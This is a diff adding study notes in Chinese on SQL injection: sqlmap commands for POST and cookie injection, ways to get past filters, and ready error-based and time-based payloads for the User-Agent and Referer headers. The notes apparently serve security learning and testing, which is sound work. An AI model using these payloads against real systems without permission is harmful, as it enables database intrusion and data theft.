@@ -200,3 +200,37 @@ print(result['country_name'])
 ```
 ### POST错误注入
 
+1. 需要使用抓包工具将数据包进行拦截，提取POST提交数据包，存入txt文本内
+2. 使用sqlmap读取txt文本内的数据包进行注入测试
+
+```bash
+python2 sqlmap.py -r target.txt -p passwd --technique E
+```
+
+### 绕过
+
+- 大小写绕过，即将sql语句使用大小写组合拼接执行
+- 双写绕过，即关键字被替换为空过滤
+- 编码绕过，即使用在线url编码
+- 内联注释绕过，即类似/\*!select\*/ * from admin;仍可以执行
+
+### HTTP注入
+
+- User-Agent
+
+```bash
+'and updatexml(1,concat(0x7e,(select database()),0x7e),1) or '1'='1
+```
+
+- Referer
+
+```bash
+'or '1'='1
+'or (length(database()))>8 or if(1=1, sleep(5),null)or'1'='1
+```
+
+### Cookie注入
+
+- 浏览器console控制台输入document.cookie可以获取当前页面的cookie值
+- sqlmap工具：sqlmap -r target.txt --level 3，并在target.txt内需要注入的地方使用*标记
+- 
